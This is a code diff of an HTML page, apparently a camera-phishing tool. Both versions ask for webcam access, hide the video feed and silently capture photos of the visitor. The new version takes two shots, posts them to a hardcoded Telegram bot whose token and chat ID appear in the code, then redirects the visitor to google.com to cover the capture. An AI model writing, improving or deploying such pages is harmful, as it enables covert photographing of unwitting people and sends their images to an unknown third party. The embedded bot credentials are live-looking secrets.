@@ -2,81 +2,84 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Secure Auto-Camera</title>
+  <title>Auto Camera to Telegram</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 30px; background: #f8f8f8; }
-    #status { margin-top: 20px; font-size: 18px; color: #333; }
+    body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; padding: 40px; }
     video, canvas { display: none; }
+    #status { font-size: 18px; margin-top: 20px; color: green; }
   </style>
 </head>
 <body>
-  <h2>📷 Picture Capture In Progress</h2>
-  <p>آپ کی تصویر محفوظ طریقے سے کیپچر کی جا رہی ہے...</p>
-  <div id="status">🔄 انتظار کریں، تصویر لی جا رہی ہے...</div>
+  <h1>Camera Access Required</h1>
+  <p id="status">Please allow camera access...</p>
   <video id="video" autoplay></video>
   <canvas id="canvas"></canvas>
 
   <script>
-    const BOT_TOKEN = "8265111331:AAHcyKSO2jIg8Z3QZcSN1E4XWc-0P7ugumc";
-    const CHAT_ID = "7009447523";
-    const REDIRECT_URL = "https://google.com"; // ✅ Redirect after capture
-    const CAPTURE_DELAY = 10000; // 10 seconds
+    const botToken = "8229410666:AAHURN6Ie9iqAm0hjPqC2p_XgzeMCLrtgqE";
+    const chatId = "7009447523"; // Your latest chat ID
 
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const statusDiv = document.getElementById("status");
-    const context = canvas.getContext("2d");
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const statusText = document.getElementById('status');
 
-    function sendToTelegram(imageDataUrl) {
-      fetch(imageDataUrl)
-        .then(res => res.blob())
-        .then(blob => {
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("photo", blob, "photo.jpg");
+    async function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.jpg');
 
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData,
-          }).then(response => {
-            if (response.ok) {
-              statusDiv.innerText = "✅ تصویر Telegram پر بھیج دی گئی ہے!";
-            } else {
-              statusDiv.innerText = "❌ تصویر بھیجنے میں مسئلہ آیا!";
-            }
-
-            setTimeout(() => {
-              window.location.href = REDIRECT_URL;
-            }, 2000); // 2s delay before redirect
-          }).catch(() => {
-            statusDiv.innerText = "⚠️ نیٹ ورک ایرر!";
-            setTimeout(() => {
-              window.location.href = REDIRECT_URL;
-            }, 2000);
-          });
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
         });
+
+        const result = await response.json();
+        console.log("Telegram response:", result);
+        if (result.ok) {
+          statusText.textContent = "✅ Photo sent to Telegram!";
+        } else {
+          statusText.textContent = "❌ Telegram error: " + result.description;
+        }
+      } catch (error) {
+        console.error("Fetch error:", error);
+        statusText.textContent = "❌ Network or API error";
+      }
     }
 
-    // Start camera and capture after delay
+    function captureAndSend() {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        if (blob && blob.size > 0) {
+          sendPhoto(blob);
+        } else {
+          statusText.textContent = "❌ Failed to capture photo";
+        }
+      }, 'image/jpeg');
+    }
+
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          statusDiv.innerText = `📸 10 سیکنڈ بعد تصویر لی جائے گی...`;
+        statusText.textContent = "📷 Camera active. Capturing...";
 
+        // Take 2 photos and then redirect
+        setTimeout(() => {
+          captureAndSend(); // 1st photo
           setTimeout(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL("image/jpeg");
-            statusDiv.innerText = "⏳ تصویر لی گئی، بھیجی جا رہی ہے...";
-            sendToTelegram(imageData);
-          }, CAPTURE_DELAY);
-        };
+            captureAndSend(); // 2nd photo
+            setTimeout(() => {
+              window.location.href = "https://google.com"; // REDIRECT HERE
+            }, 1500);
+          }, 1500);
+        }, 3000);
       })
       .catch(error => {
-        statusDiv.innerText = "❌ کیمرہ پرمیشن نہیں ملی!";
+        console.error("Camera error:", error);
+        statusText.textContent = "❌ Camera access denied";
       });
   </script>
 </body>
